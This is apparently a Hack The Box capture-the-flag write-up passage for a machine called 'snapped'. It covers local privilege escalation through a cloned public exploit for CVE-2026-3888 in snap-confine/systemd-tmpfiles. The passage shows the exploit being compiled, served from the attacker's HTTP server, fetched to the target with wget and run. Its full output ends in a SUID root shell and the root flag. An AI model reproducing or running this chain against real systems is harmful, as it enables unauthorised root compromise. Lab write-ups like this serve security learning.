root         612  0.0  0.0      0     0 ?        S    09:41   0:00 [jbd2/sda2-8]
root         613  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-ext4-rsv-conversion]
root         615  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/61-vmw_vmci]
root         616  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/62-vmw_vmci]
root         619  0.0  0.0      0     0 ?        S    09:41   0:00 [irq/63-vmw_vmci]
systemd+     684  0.0  0.1  17704  7616 ?        Ss   09:41   0:01 /usr/lib/systemd/systemd-oomd
systemd+     690  0.0  0.3  21592 12736 ?        Ss   09:41   0:00 /usr/lib/systemd/systemd-resolved
systemd+     698  0.0  0.1  91060  7776 ?        Ssl  09:41   0:01 /usr/lib/systemd/systemd-timesyncd
root         846  0.0  0.2  56076 11752 ?        Ss   09:41   0:00 /usr/bin/VGAuthService
root         866  0.1  0.2 246164 10564 ?        Ssl  09:41   0:05 /usr/bin/vmtoolsd
dhcpcd       890  0.0  0.1   8568  4120 ?        S    09:41   0:00 dhcpcd: eth0 [ip4] [ip6]
root         892  0.0  0.0   8424  2440 ?        S    09:41   0:00 dhcpcd: [privileged proxy] eth0 [ip4] [ip6]
dhcpcd       893  0.0  0.0   8408  1984 ?        S    09:41   0:00 dhcpcd: [network proxy] eth0 [ip4] [ip6]
dhcpcd       894  0.0  0.0   8400  1920 ?        S    09:41   0:00 dhcpcd: [control proxy] eth0 [ip4] [ip6]
root         994  0.0  0.0      0     0 ?        I<   09:41   0:00 [kworker/R-cfg80211]
dhcpcd      1347  0.0  0.0   8424  2068 ?        S    09:42   0:00 dhcpcd: [BPF ARP] eth0 10.129.2.143
dhcpcd      1348  0.0  0.0   8424  2116 ?        S    09:42   0:00 dhcpcd: [DHCP6 proxy] fe80::a9b8:3b12:b61f:32e2
dhcpcd      1354  0.0  0.0   8424  2116 ?        S    09:42   0:00 dhcpcd: [DHCP6 proxy] dead:beef::d726:761b:558c:6019
dhcpcd      1365  0.0  0.0   8424  2180 ?        S    09:42   0:00 dhcpcd: [BOOTP proxy] 10.129.2.143
avahi       1519  0.0  0.1   8756  4520 ?        Ss   09:43   0:00 avahi-daemon: running [snapped.local]
message+    1520  0.0  0.1  11100  6632 ?        Ss   09:43   0:01 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslo
gnome-r+    1525  0.0  0.4 439092 16260 ?        Ssl  09:43   0:00 /usr/libexec/gnome-remote-desktop-daemon --system
polkitd     1544  0.0  0.2 384516 10872 ?        Ssl  09:43   0:00 /usr/lib/polkit-1/polkitd --no-debug
root        1549  0.0  0.1 313504  7652 ?        Ssl  09:43   0:00 /usr/libexec/power-profiles-daemon
root        1572  0.0  0.8 1843600 33828 ?       Ssl  09:43   0:01 /usr/lib/snapd/snapd
root        1573  0.0  0.2 313920  8196 ?        Ssl  09:43   0:00 /usr/libexec/accounts-daemon
root        1574  0.0  0.0   9432  2856 ?        Ss   09:43   0:00 /usr/sbin/cron -f -P
root        1575  0.0  0.1 309728  6796 ?        Ssl  09:43   0:00 /usr/libexec/switcheroo-control
root        1583  0.0  0.2  18140  9256 ?        Ss   09:43   0:00 /usr/lib/systemd/systemd-logind
root        1595  0.0  0.3 468968 13628 ?        Ssl  09:43   0:00 /usr/libexec/udisks2/udisksd
syslog      1644  0.1  0.1 222572  6576 ?        Ssl  09:43   0:04 /usr/sbin/rsyslogd -n -iNONE
avahi       1673  0.0  0.0   8488  1532 ?        S    09:43   0:00 avahi-daemon: chroot helper
root        1682  0.0  0.4 336248 18460 ?        Ssl  09:43   0:00 /usr/sbin/NetworkManager --no-daemon
root        1683  0.0  0.1  17392  6344 ?        Ss   09:43   0:00 /usr/sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
root        1751  0.0  0.3 318376 12668 ?        Ssl  09:43   0:00 /usr/sbin/ModemManager
root        1856  0.0  0.3  38404 12084 ?        Ss   09:43   0:00 /usr/sbin/cupsd -l
www-data    1857  1.0  3.7 1526332 149208 ?      Ssl  09:43   0:47 /usr/local/bin/nginx-ui -config /usr/local/etc/nginx-ui/app.ini
root        1876  0.0  0.1  12032  7920 ?        Ss   09:43   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
kernoops    1877  0.0  0.0  12752  2392 ?        Ss   09:43   0:00 /usr/sbin/kerneloops --test
cups-br+    1883  0.0  0.4 268504 19592 ?        Ssl  09:43   0:00 /usr/sbin/cups-browsed
root        1887  0.0  0.0  11172  1764 ?        Ss   09:43   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1888  0.2  0.1  13508  5976 ?        S    09:43   0:11 nginx: worker process
www-data    1889  0.3  0.1  13544  6036 ?        S    09:43   0:13 nginx: worker process
kernoops    1891  0.0  0.0  12752  2336 ?        Ss   09:43   0:00 /usr/sbin/kerneloops
root        1896  0.0  0.2 314700  9248 ?        Ssl  09:43   0:00 /usr/sbin/gdm3
root        1903  0.0  0.2 242028  9884 ?        Sl   09:43   0:00 gdm-session-worker [pam/gdm-launch-environment]
root        1916  0.0  0.0      0     0 ?        S    09:43   0:00 [psimon]
gdm         1918  0.0  0.2  20692 11836 ?        Ss   09:43   0:00 /usr/lib/systemd/systemd --user
gdm         1919  0.0  0.0  21472  3648 ?        S    09:43   0:00 (sd-pam)
gdm         1931  0.0  0.2 112808 11476 ?        S<sl 09:43   0:00 /usr/bin/pipewire
gdm         1932  0.0  0.1  97744  5892 ?        Ssl  09:43   0:00 /usr/bin/pipewire -c filter-chain.conf
gdm         1934  0.0  0.1 235676  6192 tty1     Ssl+ 09:43   0:00 /usr/libexec/gdm-wayland-session dbus-run-session -- gnome-session --autostart /usr/share/
gdm         1935  0.0  0.3 404944 15780 ?        S<sl 09:43   0:00 /usr/bin/wireplumber
gdm         1938  0.0  0.2 109700 11048 ?        S<sl 09:43   0:00 /usr/bin/pipewire-pulse
gdm         1939  0.0  0.1   9500  5104 ?        Ss   09:43   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activatio
gdm         1950  0.0  0.1 536568  7544 ?        Ssl  09:43   0:00 /usr/libexec/xdg-document-portal
gdm         1955  0.0  0.0   6508  2508 tty1     S+   09:43   0:00 dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
rtkit       1956  0.0  0.0  22948  3416 ?        SNsl 09:43   0:00 /usr/libexec/rtkit-daemon
gdm         1957  0.0  0.1   9904  5608 tty1     S+   09:43   0:00 dbus-daemon --nofork --print-address 4 --session
gdm         1961  0.0  0.4 668148 17956 tty1     Sl+  09:43   0:00 /usr/libexec/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
gdm         1967  0.0  0.1 309316  6220 ?        Ssl  09:43   0:00 /usr/libexec/xdg-permission-store
root        1976  0.0  0.0   2712  2024 ?        Ss   09:43   0:00 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/120/
gdm         2008  0.2  6.0 3792300 242532 tty1   Sl+  09:43   0:08 /usr/bin/gnome-shell
gdm         2058  0.0  0.1 383112  7936 tty1     Sl+  09:43   0:00 /usr/libexec/at-spi-bus-launcher
gdm         2064  0.0  0.1   9488  4980 tty1     S+   09:43   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork
gdm         2065  0.0  1.6 244852 64424 tty1     S+   09:43   0:00 /usr/bin/Xwayland :1024 -rootless -noreset -accessx -core -auth /run/user/120/.mutter-Xway
gdm         2067  0.0  0.1 236076  7652 tty1     Sl+  09:43   0:00 /usr/libexec/at-spi2-registryd --use-gnome-session
colord      2068  0.0  0.3 320068 14640 ?        Ssl  09:43   0:00 /usr/libexec/colord
gdm         2115  0.0  0.1 309316  6196 tty1     Sl+  09:43   0:00 /usr/libexec/xdg-permission-store
gdm         2127  0.0  0.6 2527640 26456 tty1    Sl+  09:43   0:00 /usr/bin/gjs -m /usr/share/gnome-shell/org.gnome.Shell.Notifications
root        2128  0.0  0.2 316440  8916 ?        Ssl  09:43   0:00 /usr/libexec/upowerd
gdm         2135  0.0  0.2 543364 11652 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-sharing
gdm         2141  0.0  0.4 412388 19060 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-wacom
gdm         2149  0.0  0.4 413120 19176 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-color
gdm         2154  0.0  0.4 411436 18192 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-keyboard
gdm         2165  0.0  0.2 323772 11620 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-print-notifications
gdm         2166  0.0  0.1 531092  6940 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-rfkill
gdm         2167  0.0  0.2 459724  8412 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-smartcard
gdm         2176  0.0  0.3 431848 12288 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-datetime
gdm         2190  0.0  0.5 520544 23916 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-media-keys
gdm         2198  0.0  0.1 309568  6440 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-screensaver-proxy
gdm         2210  0.0  0.2 393676  9964 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-sound
gdm         2216  0.0  0.1 383692  6896 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-a11y-settings
gdm         2223  0.0  0.2 459172  8120 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-housekeeping
gdm         2228  0.0  0.5 597400 22844 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-power
gdm         2285  0.0  0.3 416248 15232 tty1     Sl+  09:43   0:00 /usr/libexec/gsd-printer
gdm         2357  0.0  2.3 1118328 95684 tty1    Sl+  09:43   0:00 /usr/libexec/mutter-x11-frames
gdm         2359  0.0  0.3 388684 12208 tty1     Sl   09:43   0:00 ibus-daemon --panel disable -r --xim
gdm         2367  0.0  0.1 236652  7160 tty1     Sl   09:43   0:00 /usr/libexec/ibus-memconf
gdm         2369  0.0  1.7 486788 70048 tty1     Sl   09:43   0:00 /usr/libexec/ibus-x11 --kill-daemon
gdm         2371  0.0  0.1 310432  7304 tty1     Sl+  09:43   0:00 /usr/libexec/ibus-portal
gdm         2423  0.0  0.1 236644  7272 tty1     Sl   09:43   0:00 /usr/libexec/ibus-engine-simple
gdm         2429  0.0  0.6 2593084 26944 tty1    Sl+  09:43   0:00 /usr/bin/gjs -m /usr/share/gnome-shell/org.gnome.ScreenSaver
root        2740  0.0  0.0      0     0 ?        I<   09:48   0:00 [kworker/u9:2]
root        2822  0.0  0.7 467436 28692 ?        Ssl  09:49   0:00 /usr/libexec/fwupd/fwupd
root        4474  0.0  0.0      0     0 ?        I    10:20   0:00 [kworker/u8:1-events_unbound]
root        4929  0.0  0.0      0     0 ?        I    10:29   0:00 [kworker/1:1-cgroup_offline]
root        5504  0.0  0.0      0     0 ?        I    10:40   0:00 [kworker/u8:0-events_unbound]
root        5883  0.0  0.0      0     0 ?        I    10:47   0:00 [kworker/0:1-cgroup_free]
root        6004  0.0  0.0      0     0 ?        I    10:49   0:00 [kworker/1:2-events]
root        6186  0.0  0.0      0     0 ?        I    10:53   0:00 [kworker/0:2]
root        6301  0.0  0.0      0     0 ?        I    10:55   0:00 [kworker/1:0-events]
root        6322  0.0  0.2  15284 10864 ?        Ss   10:55   0:00 sshd: jonathan [priv]
jonathan    6334  0.1  0.2  20668 11728 ?        Ss   10:56   0:00 /usr/lib/systemd/systemd --user
jonathan    6338  0.0  0.0  21472  3660 ?        S    10:56   0:00 (sd-pam)
jonathan    6350  0.0  0.2 109204  8756 ?        Ssl  10:56   0:00 /usr/bin/pipewire
jonathan    6351  0.0  0.1  97744  6004 ?        Ssl  10:56   0:00 /usr/bin/pipewire -c filter-chain.conf
jonathan    6352  0.3  0.2  39008 12020 ?        Ss   10:56   0:00 /snap/snapd-desktop-integration/178/usr/bin/snapd-desktop-integration
jonathan    6355  0.0  0.4 405000 16036 ?        Ssl  10:56   0:00 /usr/bin/wireplumber
jonathan    6356  0.0  0.2 109408 10700 ?        Ssl  10:56   0:00 /usr/bin/pipewire-pulse
jonathan    6365  0.0  0.1   9500  5124 ?        Ss   10:56   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activatio
jonathan    6407  0.0  0.1 611332  7564 ?        Ssl  10:56   0:00 /usr/libexec/xdg-document-portal
jonathan    6461  0.0  0.1 309316  6196 ?        Ssl  10:56   0:00 /usr/libexec/xdg-permission-store
root        6479  0.0  0.0   2712  2040 ?        Ss   10:56   0:00 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000
jonathan    6487  0.1  0.1  15428  7224 ?        S    10:56   0:00 sshd: jonathan@pts/0
jonathan    6508  0.0  0.1  11076  5432 pts/0    Ss   10:56   0:00 -bash
jonathan    6573  0.1  0.5 278972 21228 ?        Sl   10:56   0:00 /snap/snapd-desktop-integration/178/usr/bin/snapd-desktop-integration
jonathan    6650  0.0  0.1  13620  4544 pts/0    R+   10:57   0:00 ps aux
jonathan@snapped:~$ snap version
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic

```

<img width="1918" height="422" alt="image" src="https://github.com/user-attachments/assets/320b5698-df7a-446e-a023-058b09504106" />



```
(root㉿kali)-[/home/…/HTB/backup/backup_extracted/nginx-ui]
└─# git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE.git
Cloning into 'CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE'...
remote: Enumerating objects: 21, done.
remote: Counting objects: 100% (21/21), done.
remote: Compressing objects: 100% (18/18), done.
remote: Total 21 (delta 6), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (21/21), 21.23 KiB | 362.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.
   
┌──(root㉿kali)-[/home/…/HTB/backup/backup_extracted/nginx-ui]
└─# cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE

┌──(root㉿kali)-[/home/…/backup/backup_extracted/nginx-ui/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE]
└─# gcc -O2 -static -o exploit exploit_suid.c

┌──(root㉿kali)-[/home/…/backup/backup_extracted/nginx-ui/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE]
└─# gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
   
┌──(root㉿kali)-[/home/…/backup/backup_extracted/nginx-ui/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE]
└─# ls
exploit  exploit_caps.c  exploit_suid.c  librootshell_caps.c  librootshell.so  librootshell_suid.c  README.md

┌──(root㉿kali)-[/home/…/backup/backup_extracted/nginx-ui/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE]
└─# python3 -m http.server 8080                                                  
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.2.143 - - [01/Aug/2026 11:02:28] "GET /exploit HTTP/1.1" 200 -
10.129.2.143 - - [01/Aug/2026 11:03:33] "GET /librootshell.so HTTP/1.1" 200 -
10.129.2.143 - - [01/Aug/2026 11:20:43] "GET /exploit HTTP/1.1" 200 -
----------------------------------------

```

```
jonathan@snapped:~$ wget http://10.10.14.60:8080/exploit
--2026-08-01 11:08:43--  http://10.10.14.60:8080/exploit
Connecting to 10.10.14.60:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847320 (827K) [application/octet-stream]
Saving to: ‘exploit’

exploit                                 100%[============================================================================>] 827.46K   634KB/s    in 1.3s    

2026-08-01 11:08:45 (634 KB/s) - ‘exploit’ saved [847320/847320]

jonathan@snapped:~$ ls
Desktop  Documents  Downloads  exploit  Music  Pictures  Public  snap  Templates  user.txt  Videos
jonathan@snapped:~$ chmod +x exploit 
jonathan@snapped:~$ wget http://10.10.14.60:8080/librootshell.so
--2026-08-01 11:09:49--  http://10.10.14.60:8080/librootshell.so
Connecting to 10.10.14.60:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9056 (8.8K) [application/octet-stream]
Saving to: ‘librootshell.so’

librootshell.so                         100%[============================================================================>]   8.84K  --.-KB/s    in 0.007s  

2026-08-01 11:09:49 (1.24 MB/s) - ‘librootshell.so’ saved [9056/9056]

jonathan@snapped:~$ chmod +x librootshell.so

```

```
jonathan@snapped:~$ ./exploit librootshell.so
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/librootshell.so (9056 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 8135

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 30 days on stock Ubuntu).
[*] Hint: use -s to skip.
[+] .snap deleted.

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_m1G5B0//dev: No such file or directory
[+] Namespace destroyed.

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/8135/cwd
[*]   Building .snap and .exchange...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 8708)...

[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[*]   ld-linux in namespace: jonathan:jonathan 755
[+]   Poisoned namespace PID: 8708

[Phase 5] Injecting payload into poisoned namespace...
[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
[*]   Planting busybox...
[*]   Writing escape script → /tmp/sh
[*]   Overwriting ld-linux-x86-64.so.2...
[+]   Payload injected.

[Phase 6] Triggering root via SUID snap-confine...
[*]   snap-confine → snap-confine (SUID trigger)
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
[*] Cleaning up background processes...

================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================

bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
bash-5.1# pwd
/home/jonathan
bash-5.1# cd root/root.txt
bash: cd: root/root.txt: No such file or directory
bash-5.1# cd ../../../root/root.txt
bash: cd: ../../../root/root.txt: Not a directory
bash-5.1# ls
Desktop  Documents  Downloads  exploit  librootshell.so  Music  Pictures  Public  snap  Templates  user.txt  Videos
bash-5.1# cd  ../../..
bash-5.1# ls
bin                boot   dev  home  lib64              lost+found  mnt  proc  run   sbin.usr-is-merged  srv  tmp  var
bin.usr-is-merged  cdrom  etc  lib   lib.usr-is-merged  media       opt  root  sbin  snap                sys  usr
bash-5.1# cd root
bash-5.1# ls
nginxui  root.txt  snap
bash-5.1# cat root.txt
542c3963903f8e9029dd87d7b3535798
bash-5.1# 

```

<img width="1605" height="607" alt="image" src="https://github.com/user-attachments/assets/a1bbc5ab-35ae-4d8b-bb97-0cb2869355c3" />



<img width="718" height="789" alt="image" src="https://github.com/user-attachments/assets/8dccea1b-516f-4f89-9d29-d147201a06d1" />
